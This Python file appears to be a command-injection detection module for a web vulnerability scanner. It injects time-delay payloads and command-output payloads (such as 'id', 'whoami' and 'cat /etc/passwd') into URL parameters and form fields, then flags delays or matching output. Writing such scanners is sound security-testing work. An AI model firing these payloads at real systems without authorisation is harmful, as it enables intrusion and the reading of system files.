"""Command Injection Detection Module."""

import time
import re
from modules.base import BaseModule
from lib.logger import log


class CmdInjectionModule(BaseModule):
    """Detect OS command injection vulnerabilities."""

    name = "cmd_injection"
    description = "OS command injection detection (blind and reflected)"

    # Time-based payloads (no output needed)
    TIME_PAYLOADS = [
        ("| sleep 5", 5),
        ("; sleep 5", 5),
        ("|| sleep 5", 5),
        ("&& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("%0a sleep 5", 5),
        ("\n sleep 5", 5),
        ("| ping -c 5 127.0.0.1", 5),
        ("; ping -c 5 127.0.0.1", 5),
    ]

    # Output-based payloads
    OUTPUT_PAYLOADS = [
        ("| id", r"uid=\d+"),
        ("; id", r"uid=\d+"),
        ("|| id", r"uid=\d+"),
        ("&& id", r"uid=\d+"),
        ("`id`", r"uid=\d+"),
        ("$(id)", r"uid=\d+"),
        ("| whoami", r"[a-zA-Z0-9_-]+"),
        ("; whoami", r"[a-zA-Z0-9_-]+"),
        ("| cat /etc/passwd", r"root:"),
        ("; cat /etc/passwd", r"root:"),
        ("| type C:\\windows\\win.ini", r"\[fonts\]"),
        ("; type C:\\windows\\win.ini", r"\[fonts\]"),
        ("%0a id", r"uid=\d+"),
    ]

    def run(self, param_urls, forms):
        """Run command injection detection."""
        for url in param_urls:
            params = self.get_params(url)
            for param in params:
                self._test_time_based(url, param)
                self._test_output_based(url, param)

        for form in forms:
            self._test_form(form)

        return self.findings

    def _test_time_based(self, url, param):
        """Test for blind command injection using time delay."""
        # Get baseline timing
        try:
            start = time.time()
            self.client.get(url)
            baseline = time.time() - start
        except Exception:
            return

        for payload, expected_delay in self.TIME_PAYLOADS:
            self.delay()
            test_url = self.inject_param(url, param, payload)
            try:
                start = time.time()
                self.client.get(test_url)
                elapsed = time.time() - start

                if elapsed >= expected_delay - 1 and elapsed > baseline + 2:
                    self.add_finding(
                        "cmd_injection", url, param, "critical",
                        f"Time-based: {elapsed:.1f}s delay (baseline: {baseline:.1f}s)",
                        payload, "Blind OS command injection via time delay"
                    )

                    if self.ai and self.ai.enabled:
                        analysis = self.ai.analyze_vulnerability(
                            "cmd_injection", url, param, {"payload": payload}, f"Delay: {elapsed:.1f}s"
                        )
                        self.findings[-1].ai_analysis = analysis
                    return
            except Exception:
                pass

    def _test_output_based(self, url, param):
        """Test for command injection with visible output."""
        for payload, pattern in self.OUTPUT_PAYLOADS:
            self.delay()
            test_url = self.inject_param(url, param, payload)
            try:
                resp = self.client.get(test_url)
                if re.search(pattern, resp.text):
                    self.add_finding(
                        "cmd_injection", url, param, "critical",
                        f"Command output detected matching: {pattern}",
                        payload, "OS command injection with output reflection"
                    )
                    return
            except Exception:
                pass

    def _test_form(self, form):
        """Test form inputs for command injection."""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "hidden", "file"):
                continue

            for payload, pattern in self.OUTPUT_PAYLOADS[:6]:
                self.delay()
                data = {}
                for field in inputs:
                    data[field["name"]] = payload if field["name"] == inp["name"] else field.get("value", "test")

                try:
                    if method == "POST":
                        resp = self.client.post(action, data=data)
                    else:
                        resp = self.client.get(action, params=data)

                    if re.search(pattern, resp.text):
                        self.add_finding(
                            "cmd_injection", action, inp["name"], "critical",
                            f"Command output in form response",
                            payload, "OS command injection via form"
                        )
                        return
                except Exception:
                    pass
